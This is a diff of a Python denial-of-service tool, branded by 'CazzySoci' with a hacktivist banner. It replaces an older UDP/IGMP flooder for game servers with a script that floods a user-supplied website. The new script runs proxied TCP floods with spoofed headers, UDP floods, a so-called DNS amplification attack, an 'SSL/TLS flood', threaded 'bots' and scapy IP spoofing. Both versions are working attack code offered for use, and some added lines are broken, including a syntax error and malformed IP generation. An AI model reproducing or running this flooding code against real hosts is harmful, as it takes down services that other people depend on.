@@ -1,262 +1,186 @@
-#Since : 25-07-2022
-#-------[ ALL IMPORT ]-------#
 import socket
 import struct
-import codecs
-import sys
-import threading
+import concurrent.futures
 import random
+import threading
 import time
-import os
-#-------[ ALL SETTINGS ]-------#
-ip = sys.argv[1]
-port = sys.argv[2]
+import urllib.parse
+import requests
+from scapy.all import *
+import socks
 
-#ip = str(input("IP TARGET:"))
-#port = int(input("PORT TARGET:"))
-
+credit = """
+\033[1;36m
+▄▄▄       ███▄    █  ▒█████   ███▄    █  ▄████▄   ▄▄▄      ▒███████▒▒███████▒▓██   ██▓  ██████  ▒█████   ▄████▄   ██▓
+▒████▄     ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ▀█  ▒████▄    ▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██    ▒ ▒██▒  ██▒▒██▀ ▀█  ▓██▒
+▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒▒▓█    ▄ ▒██  ▀█▄  ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░   ▒██ ██░░ ▓██▄   ▒██░  ██▒▒▓█    ▄ ▒██▒
+░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░██▄▄▄▄██   ▄▀▒   ░  ▄▀▒   ░  ░ ▐██▓░  ▒   ██▒▒██   ██░▒▓▓▄ ▄██▒░██░
+▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░▒ ▓███▀ ░ ▓█   ▓██▒▒███████▒▒███████▒  ░ ██▒▓░▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░
+▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓ 
+  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░  ▒     ▒   ▒▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒ ▓██ ░▒░ ░ ░▒  ░ ░  ░ ▒ ▒░   ░  ▒    ▒ ░
+  ░   ▒      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░ ░          ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ░ ░ ▒ ▒ ░░  ░  ░  ░  ░ ░ ░ ▒  ░         ▒ ░
+      ░  ░         ░     ░ ░           ░ ░ ░            ░  ░  ░ ░      ░ ░     ░ ░           ░      ░ ░  ░ ░       ░ 
+                                         ░                  ░        ░         ░ ░                       ░           
+╔════════════════════════╗
+║ Created by: CazzySoci  ║
+║                        ║
+║      𝓦𝓔𝓛𝓒𝓞𝓜𝓔           ║
+║                        ║
+║  We Are AnonCazzySoci  ║
+║    •We don't die       ║
+║    •We Multiply        ║
+║    •Expect us!         ║
+╚════════════════════════╝
+\033[1;36m
+"""
+print(credit)
+url = input("Enter the target website URL: ")
+parsed_url = urllib.parse.urlparse(url)
+target_ip = socket.gethostbyname(parsed_url.netloc)
+target_port = 80
 fake_ip = '66.118.234.34:22'
 
-proxysy = open('cazzy.txt').readlines()
-bots = len(proxysy)
-user = ('ADMIN')
-#---------------------[ Randomlex CODE ]---------------------#
-Randomlex = [
- b'SAMP\x90\xd9\x1dMa\x1ep\nF[\x00',
- b'SAMP\x958\xe1\xa9a\x1ec',
- b'SAMP\x958\xe1\xa9a\x1ei',
- b'SAMP\x958\xe1\xa9a\x1er',
- b'SAMP\x958\xe1\xa9a\x1ev',
- b'SAMP\x958\xe1\xa9a\x1eg',
- b'\x08\x1eb\xda',
- b'\x08\x1eb\xda',
- b'\x02\x1e\xfdS',
- b'\x08\x1eM\xda',
- b'\x02\x1e\xfd@',
- b'\x08\x1e~\xda'
- ]
-prot = (random.randint(200,350))
-sys.stdout.write("\x1b]2;[-] ULTRAS | Online User : [{}] | Running Attack [1] | Bot Connected [{}] | Username : {}\x07".format (prot,bots,user))
+if parsed_url.scheme == 'https':
+    target_port = 443
 
-os.system("clear")
-#---------------------[ BANNER'S ]---------------------
-banner =  """
-\033[36m                        ╔════════════════════════════════════╗
-\033[36m                        ║       \033[33m╦ ╦ ╦  ═╦═ ╦═╗ ╔═╗ ╔═╗       \033[36m║
-\033[36m                        ║       \033[33m║ ║ ║   ║  ╠╦╝ ╠╩╣ ╚═╗       \033[36m║
-\033[36m                        ║       \033[33m╚═╝ ╩═╝ ╩  ╩╚═ ╩ ╩ ╚═╝       \033[36m║
-\033[36m                        ╚════════════════════════════════════╝
-\033[35m                   ╔═══════════════════════════════════════════╗                 
-\033[35m                   ║ \033[32m- -ATTACKING SERVER  (\033[33mAWAS DOWN BWANG\033[32m)- - \033[35m║
-\033[35m                   ╚═══════════════════════════════════════════╝
-"""
-banners = """
-\033[36m                      ╔════════════════════════════════════╗
-\033[36m                      ║\033[33m         ╦  ╔═╗═╗ ╦╔═╗╦ ╦╦ ╦\033[36m        ║
-\033[36m                      ║\033[33m         ║  ║╣ ╔╩╦╝║ ║╚╦╝╚╦╝\033[36m        ║
-\033[36m                      ║\033[33m         ╩═╝╚═╝╩ ╚═╚═╝ ╩  ╩ \033[36m        ║
-\033[36m                      ╚════════════════════════════════════╝
-\033[35m                    ╔═════════════════════════════════════════════╗                 
-\033[35m                    ║  \033[32m- -DEVELOPER TOOLS ULTRAS  (\033[33mLEX SA-MP\033[33m)- -\033[35m  ║
-\033[35m                    ╚═════════════════════════════════════════════╝
-"""
-welcome =  """
-───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───   Welcome! to ULTRASS
-───█▒▒░░░░░░░░░▒▒█───   Use "help" For Help Command
-────█░░█░░░░░█░░█────   Developer Tools : Lexyy / LEX SA-MP
-─▄▄──█░░░▀█▀░░░█──▄▄─   
-█░░█─▀▄░░░░░░░▄▀─█░░█
-█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
-█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
-█░░║║║╠─║─║─║║║║║╠─░░█
-█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
-█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
-"""
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 likeMac OS X) AppleWebKit/133.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/133.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
+    "Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html£©",
+    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 3 1 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
+    "Mozilla/5.0 (compatible; bingbot/6.0; +http://www.bing.com/bingbot.htm)",
+    "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/369.36 (KHTML, like Gecko) Mobile Safari/584.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 likeMac OS X) AppleWebKit/275.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/123.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
+    "Mozilla/5.0 (compatible; Baiduspider/7.0;+http://www.baidu.com/search/spider.html£©",
+    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 6 1 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
+    "Mozilla/5.0 (compatible; bingbot/3.0; +http://www.bing.com/bingbot.htm)",
+    "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/147.36 (KHTML, like Gecko) Mobile Safari/480.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 likeMac OS X) AppleWebKit/597.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/599.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
+    "Mozilla/5.0 (compatible; Baiduspider/9.0;+http://www.baidu.com/search/spider.html£©",
+    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 8 5 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
+    "Mozilla/5.0 (compatible; bingbot/4.0; +http://www.bing.com/bingbot.htm)",
+     "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/254.36 (KHTML, like Gecko) Mobile Safari/225.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
+     "Mozilla/5.0 (iPhone; CPU iPhone OS 6_1 likeMac OS X) AppleWebKit/259.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/296.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
+     "Mozilla/5.0 (compatible; Baiduspider/5.0;+http://www.baidu.com/search/spider.html£©",
+     "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 5 5 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
+     "Mozilla/5.0 (compatible; bingbot/6.0; +http://www.bing.com/bingbot.htm)",
+     "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/304.36 (KHTML, like Gecko) Mobile Safari/487.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
+     "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 likeMac OS X) AppleWebKit/488.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/528.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
+     "Mozilla/5.0 (compatible; Baiduspider/5.0;+http://www.baidu.com/search/spider.html£©",
+     "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 1 1 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
+     "Mozilla/5.0 (compatible; bingbot/8.0; +http://www.bing.com/bingbot.htm)",
+     "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/406.36 (KHTML, like Gecko) Mobile Safari/553.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
+     "Mozilla/5.0 (iPhone; CPU iPhone OS 6_1 likeMac OS X) AppleWebKit/259.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/296.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
+     "Mozilla/5.0 (compatible; Baiduspider/5.0;+http://www.baidu.com/search/spider.html£©",
+     "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 5 5 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
+     "Mozilla/5.0 (compatible; bingbot/6.0; +http://www.bing.com/bingbot.htm)",
+     "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/304.36 (KHTML, like Gecko) Mobile Safari/487.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
+     "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 likeMac OS X) AppleWebKit/488.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/528.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
+     "Mozilla/5.0 (compatible; Baiduspider/5.0;+http://www.baidu.com/search/spider.html£©",
+     "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 1 1 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
+     "Mozilla/5.0 (compatible; bingbot/8.0; +http://www.bing.com/bingbot.htm)",
+     "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/406.36 (KHTML, like Gecko) Mobile Safari/553.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
 
-print(welcome)
-time.sleep(3)
-os.system("clear")
-print(banner)
-time.sleep(0.9)
-print ("\033[36m[BOT] \033[32m• \033[33mYOU ATTACK HAS LAUNCHED TO IP \033[31m%s \033[32mAND PORT \033[31m%s"%(ip,port))
+]
 
-def spoofer():
-    addr = [192, 168, 0, 1]
-    d = '4.240.112.191'
-    addr[0] = str(random.randrange(11, 197))
-    addr[1] = str(random.randrange(0, 255))
-    addr[2] = str(random.randrange(0, 255))
-    addr[3] = str(random.randrange(2, 254))
-    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
-    return assemebled
+source_ips = [
+    '.'.join(str(random.randint(1, 255)) for _ in range(4)) + '.' + str(random.randint(1, 255))
+    for _ in range(2000000)  # Increase this number to generate more IP addresses
+]
 
-#--------------[ START DDOS BY LEXYY ]--------------#
-def xxxxxxx():
+proxies = []
+with open('socks5'.txt', 'r') as file:
+    proxies = file.read().splitlines()
+
+def ddos_tcp():
     while True:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1081) #1081
-        pack = random._urandom(999) #666
-        payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'#ATTACK HEX
-        msg = Randomlex[random.randrange(0, 9)]
-        sock.sendto(bytes, (ip, int(port)))
-        sock.sendto(pack, (ip, int(port)))
-        sock.sendto(payload, (ip, int(port)))
-        sock.sendto(msg, (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[1], (ip, int(port)))
-        sock.sendto(Randomlex[2], (ip, int(port)))
-        sock.sendto(Randomlex[3], (ip, int(port)))
-        sock.sendto(Randomlex[4], (ip, int(port)))
-        sock.sendto(Randomlex[5], (ip, int(port)))
-        sock.sendto(Randomlex[6], (ip, int(port)))
-        sock.sendto(Randomlex[7], (ip, int(port)))
-        sock.sendto(Randomlex[8], (ip, int(port)))
-        sock.sendto(Randomlex[9], (ip, int(port)))
-        sock.sendto(Randomlex[10], (ip, int(port)))
-        sock.sendto(Randomlex[11], (ip, int(port)))
+        try:
+            proxy_address = random.choice(proxies)
+            
+            sock = socks.socksocket()
+            sock.set_proxy(socks.SOCKS5, proxy_address.split(':')[0], int(proxy_address.split(':')[1]))
+            
+            sock.connect((target_ip, target_port))
 
-def xxxxxx():
-    while True:
-        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-        bytes = random._urandom(1460)
-        payload = b'\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-        sock.sendto(bytes, (ip, int(port)))
-        sock.sendto(payload, (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[1], (ip, int(port)))
-        sock.sendto(Randomlex[2], (ip, int(port)))
-        sock.sendto(Randomlex[3], (ip, int(port)))
-        sock.sendto(Randomlex[4], (ip, int(port)))
-        sock.sendto(Randomlex[5], (ip, int(port)))
-        sock.sendto(Randomlex[6], (ip, int(port)))
-        sock.sendto(Randomlex[7], (ip, int(port)))
-        sock.sendto(Randomlex[8], (ip, int(port)))
-        sock.sendto(Randomlex[9], (ip, int(port)))
-        sock.sendto(Randomlex[10], (ip, int(port)))
-        sock.sendto(Randomlex[11], (ip, int(port)))
+            payload = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(131072, 262144)))
+            source_ip = random.choice(source_ips)
+            user_agent = random.choice(user_agents)
 
-def xxxxx():
-    while True:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1081) #1081
-        pack = random._urandom(999) #666
-        msg = Randomlex[random.randrange(0, 9)]
-        sock.sendto(bytes, (ip, int(port)))
-        sock.sendto(pack, (ip, int(port)))
-        sock.sendto(msg, (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[1], (ip, int(port)))
-        sock.sendto(Randomlex[2], (ip, int(port)))
-        sock.sendto(Randomlex[3], (ip, int(port)))
-        sock.sendto(Randomlex[4], (ip, int(port)))
-        sock.sendto(Randomlex[5], (ip, int(port)))
-        sock.sendto(Randomlex[6], (ip, int(port)))
-        sock.sendto(Randomlex[7], (ip, int(port)))
-        sock.sendto(Randomlex[8], (ip, int(port)))
-        sock.sendto(Randomlex[9], (ip, int(port)))
-        sock.sendto(Randomlex[10], (ip, int(port)))
-        sock.sendto(Randomlex[11], (ip, int(port)))
+            request = f"GET {parsed_url.path}?{parsed_url.query} HTTP/1.1\r\nHost: {parsed_url.netloc}\r\nUser-Agent: {user_agent}\r\nX-Forwarded-For: {source_ip}\r\n\r\n"
 
-def xxxx():
-    while True:
-        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-        bytes = random._urandom(1460)
-        sock.sendto(bytes, (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[1], (ip, int(port)))
-        sock.sendto(Randomlex[2], (ip, int(port)))
-        sock.sendto(Randomlex[3], (ip, int(port)))
-        sock.sendto(Randomlex[4], (ip, int(port)))
-        sock.sendto(Randomlex[5], (ip, int(port)))
-        sock.sendto(Randomlex[6], (ip, int(port)))
-        sock.sendto(Randomlex[7], (ip, int(port)))
-        sock.sendto(Randomlex[8], (ip, int(port)))
-        sock.sendto(Randomlex[9], (ip, int(port)))
-        sock.sendto(Randomlex[10], (ip, int(port)))
-        sock.sendto(Randomlex[11], (ip, int(port)))
+            sock.sendall(request.encode())
 
-def xxx():
-    while True:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1081) #1081
-        pack = random._urandom(666) #666
-        msg = Randomlex[random.randrange(0, 9)]
-        sock.sendto(bytes, (ip, int(port)))
-        sock.sendto(pack, (ip, int(port)))
-        sock.sendto(msg, (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[1], (ip, int(port)))
-        sock.sendto(Randomlex[2], (ip, int(port)))
-        sock.sendto(Randomlex[3], (ip, int(port)))
-        sock.sendto(Randomlex[4], (ip, int(port)))
-        sock.sendto(Randomlex[5], (ip, int(port)))
-        sock.sendto(Randomlex[6], (ip, int(port)))
-        sock.sendto(Randomlex[7], (ip, int(port)))
-        sock.sendto(Randomlex[8], (ip, int(port)))
-        sock.sendto(Randomlex[9], (ip, int(port)))
-        sock.sendto(Randomlex[10], (ip, int(port)))
-        sock.sendto(Randomlex[11], (ip, int(port)))
-                
-def xx():
-    while True:
-        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-        bytes = random._urandom(1460)
-        sock.sendto(bytes, (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[1], (ip, int(port)))
-        sock.sendto(Randomlex[2], (ip, int(port)))
-        sock.sendto(Randomlex[3], (ip, int(port)))
-        sock.sendto(Randomlex[4], (ip, int(port)))
-        sock.sendto(Randomlex[5], (ip, int(port)))
-        sock.sendto(Randomlex[6], (ip, int(port)))
-        sock.sendto(Randomlex[7], (ip, int(port)))
-        sock.sendto(Randomlex[8], (ip, int(port)))
-        sock.sendto(Randomlex[9], (ip, int(port)))
-        sock.sendto(Randomlex[10], (ip, int(port)))
-        sock.sendto(Randomlex[11], (ip, int(port)))
+            print("Attacking", url, "on port", target_port, "from", source_ip, "using TCP with proxy", proxy_address)
+            time.sleep(random.uniform(0.0001, 0.001))
+        except:
+            pass
 
-def x():
+def ddos_udp():
     while True:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1081) #1081
-        pack = random._urandom(999) #666
-        msg = Randomlex[random.randrange(0, 9)]
-        sock.sendto(bytes, (ip, int(port)))
-        sock.sendto(pack, (ip, int(port)))
-        sock.sendto(msg, (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[1], (ip, int(port)))
-        sock.sendto(Randomlex[2], (ip, int(port)))
-        sock.sendto(Randomlex[3], (ip, int(port)))
-        sock.sendto(Randomlex[4], (ip, int(port)))
-        sock.sendto(Randomlex[5], (ip, int(port)))
-        sock.sendto(Randomlex[6], (ip, int(port)))
-        sock.sendto(Randomlex[7], (ip, int(port)))
-        sock.sendto(Randomlex[8], (ip, int(port)))
-        sock.sendto(Randomlex[9], (ip, int(port)))
-        sock.sendto(Randomlex[10], (ip, int(port)))
-        sock.sendto(Randomlex[11], (ip, int(port)))
-        
-              
-              
-#---------------------[ AUTO RUN ]---------------------#
-if __name__ == '__main__':
-    try:
-      xxxxxxx()
-      xxxxxx()
-      xxxxx()
-      xxxx()
-      xxx()
-      xx()
-      x()
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-#---------------------[ CLOSING ]---------------------#
-    except KeyboardInterrupt:
-        os.system('cls' if os.name == 'nt' else 'clear')
-        print("\033[0;37;40mclosed")
+            payload = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(131072, 262144)))
+            source_ip = random.choice(source_ips)
+            user_agent = random.choice(user_agents)
+
+            sock.sendto(bytes(payload, "utf-8"), (target_ip, target_port))
+
+            print("Attacking", url, "on port", target_port, "from", source_ip, "using UDP")
+            time.sleep(random.uniform(0.0001, 0.001))
+        except:
+            pass
+
+def dns_amplification_attack():
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            query = f"ANY {parsed_url.netloc}.\r\n"
+
+            sock.sendto(bytes(query, "utf-8"), (target_ip, 53))
+
+            print("Performing DNS Amplification Attack on", url)
+            time.sleep(random.uniform(0.0001, 0.001))
+        except:
+            pass
+
+def ssl_tls_flood():
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((target_ip, target_port))
+
+            payload = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()') for _ in range(65535))
+
+            tls_handshake = "\x16\x03\x01" + struct.pack(">H", len(payload) + 4) + payload
+            sock.sendall(tls_handshake.encode())
+
+            print("Performing SSL/TLS Flood Attack on", url)
+            time.sleep(random.uniform(0.0001, 0.001))
+        except:
+            pass
+
+def create_botnet(num_bots):
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        for _ in range(num_bots):
+            executor.submit(ddos_tcp)
+            executor.submit(ddos_udp)
+            executor.submit(dns_amplification_attack)
+            executor.submit(ssl_tls_flood)
+
+def spoof_ip(packet):
+    packet[IP].src = random.choice(source_ips)
+    packet[IP].dst = target_ip
+    del packet[IP].chksum
+    del packet[TCP].chksum
+    send(packet, verbose=0)
+
+def start_packet_sniffing():
+    sniff(filter=f"tcp and dst port {target_port}", prn=spoof_ip)
+
+num_bots = int(input("Enter the number of bots to create: "))
+create_botnet(num_bots)
+start_packet_sniffing()
